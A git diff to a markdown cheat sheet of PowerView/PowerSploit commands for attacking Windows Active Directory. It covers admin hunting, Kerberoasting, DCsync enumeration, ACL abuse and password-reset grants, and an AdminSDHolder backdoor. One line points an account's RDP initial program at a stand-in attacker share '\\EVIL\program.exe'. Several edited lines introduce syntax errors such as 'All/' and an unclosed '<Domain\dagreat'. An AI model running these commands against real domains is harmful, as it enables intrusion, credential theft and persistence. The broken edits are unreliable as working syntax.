@@ -73,7 +73,7 @@ Invoke-UserHunter -UserName <User>
 Get-LastLoggedon -ComputerName <Computer>
 
 # PowerSploit: find users who have local admin rights
-Find-GPOComputerAdmin -ComputerName <computer>
+Find-GPOComputerAdmin -ComputerName <Computer>
 Get-NetOU Admins | %{Get-NetComputer -ADSPath $_}
 
 # PowerSploit: find users who have local admin rights
@@ -113,10 +113,10 @@ Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilt
 Get-DomainOU -GPLink '<GPP_GUID>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
 
 # Get the logged on users for all machines in any *server* OU in a particular domain
-Get-DomainOU -Identity *server* -Domain <domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}
+Get-DomainOU -Identity *server* -Domain <Domain> | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_}}
 
 # return the local *groups* of a remote server
-Get-NetLocalGroup SERVER.domain.local
+Get-NetLocalGroup <Server>.<FQDN>
 
 # Find admin groups based on "adm" keyword
 Get-NetGroup *adm* 
@@ -127,19 +127,19 @@ Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -
 # Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
 Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
 
-# find all policies applied to a current machine
-Get-DomainGPO -ComputerIdentity windows1.testlab.local
+# find all policies applied to a computer/server
+Get-DomainGPO -ComputerIdentity <Server>.<FQDN>
 
 # return the local group *members* of a remote server using Win32 API methods (faster but less info)
-Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local
+Get-NetLocalGroupMember -Method API -ComputerName <Server>.<FQDN>
 
 # enumerate the current domain controller policy
-$DCPolicy = Get-DomainPolicy -Policy DC
+$DCPolicy = Get-DomainPolicy -Policy <DC>
 $DCPolicy.PrivilegeRights # user privilege rights on the dc...
 
 # enumerate the current domain policy
 $DomainPolicy = Get-DomainPolicy -Policy Domain
-$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
+$DomainPolicy.KerberosPolicy # useful for golden tickets
 $DomainPolicy.SystemAccess # password age/etc.
 
 # enumerate what machines that a particular user/group identity has local admin rights to
@@ -147,13 +147,13 @@ $DomainPolicy.SystemAccess # password age/etc.
 Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>
 
 # enumerate what machines that a given user in the specified domain has RDP access rights to
-Get-DomainGPOUserLocalGroupMapping -Identity <USER> -Domain <DOMAIN> -LocalGroup RDP
+Get-DomainGPOUserLocalGroupMapping -Identity <User> -Domain <Domain> -LocalGroup RDP
 
 # export a csv of all GPO mappings
 Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
 
-# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
-Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
+# retrieve *most* users who can perform DC replication for dev.<Domain>.local (i.e. DCsync)
+Get-DomainObjectAcl "dc=dev,dc=<Domain>,dc=local" -ResolveGUIDs | ? {
     ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
 }
 ```
@@ -161,17 +161,17 @@ Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
 ## ENUM: DOMAIN PERSISTENCY
 
 ```powershell
-# enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
-Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
+# enumerate who has rights to the 'matt' user in '<Domain>.local', resolving rights GUIDs to names
+Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain <Domain>
 
 # grant user 'will' the rights to change 'matt's password
 Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
 
 # audit the permissions of AdminSDHolder, resolving GUIDs
-Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
+Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=<Domain>,DC=local' -ResolveGUIDs
 
 # backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<Domain>,DC=local' -PrincipalIdentity matt -Rights All/
 ```
 
 ## ENUM: FOREST PRIVESC
@@ -240,7 +240,7 @@ Get-DomainUser -PreauthNotRequired
 Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 
 # Kerberoast any users in a particular OU with SPNs set
-Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"
+Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=<Domain>,DC=local"
 ```
 
 ## MISC
@@ -251,7 +251,7 @@ Get-DomainGroup -MemberIdentity <User/Group>
 
 # use an alterate creadential for any function
 $SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat', $SecPassword)
 Get-DomainUser -Credential $Cred
 
 # all enabled users, returning distinguishednames
@@ -271,7 +271,7 @@ Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)
 Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname
 
 # use multiple identity types for any *-Domain* function
-'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
+'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dagreat,CN=Users,DC=<Domain>,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
 
 # find all computers in a given OU
 Get-DomainComputer -SearchBase "ldap://OU=..."
@@ -285,8 +285,8 @@ gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP
 # use alternate credentials for searching for files on the domain
 #   Find-InterestingDomainShareFile == old Invoke-FileFinder
 $Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
-$Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)
-Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential
+$Credential = New-Object System.Management.Automation.PSCredential("<Domain>\user",$Password)
+Find-InterestingDomainShareFile -Domain <Domain> -Credential $Credential
 
 # save a PowerView object to disk for later usage
 Get-DomainUser | Export-Clixml user.xml
@@ -297,7 +297,7 @@ Get-DomainGroup -GroupScope NotGlobal -Properties name
 
 # enumerate all foreign users in the global catalog, and query the specified domain localgroups for their memberships
 #   query the global catalog for foreign security principals with domain-based SIDs, and extract out all distinguishednames
-$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://testlab.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
+$ForeignUsers = Get-DomainObject -Properties objectsid,distinguishedname -SearchBase "GC://<Domain>.local" -LDAPFilter '(objectclass=foreignSecurityPrincipal)' | ? {$_.objectsid -match '^S-1-5-.*-[1-9]\d{2,}$'} | Select-Object -ExpandProperty distinguishedname
 $Domains = @{}
 $ForeignMemberships = ForEach($ForeignUser in $ForeignUsers) {
     # extract the domain the foreign user was added to
@@ -314,7 +314,7 @@ $ForeignMemberships | fl
 
 # if running in -sta mode, impersonate another credential a la "runas /netonly"
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('<Domain\dagreat', $SecPassword)
 Invoke-UserImpersonation -Credential $Cred
 # ... action
 Invoke-RevertToSelf
@@ -328,8 +328,8 @@ Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Ver
 # Set the owner of 'dfm' in the current domain to 'harmj0y'
 Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
 
-# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
-Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
+# retrieve *most* users who can perform DC replication for dev.<Domain>.local (i.e. DCsync)
+Get-ObjectACL "DC=<Domain>,DC=local" -ResolveGUIDs | ? {
     ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')
 }
 
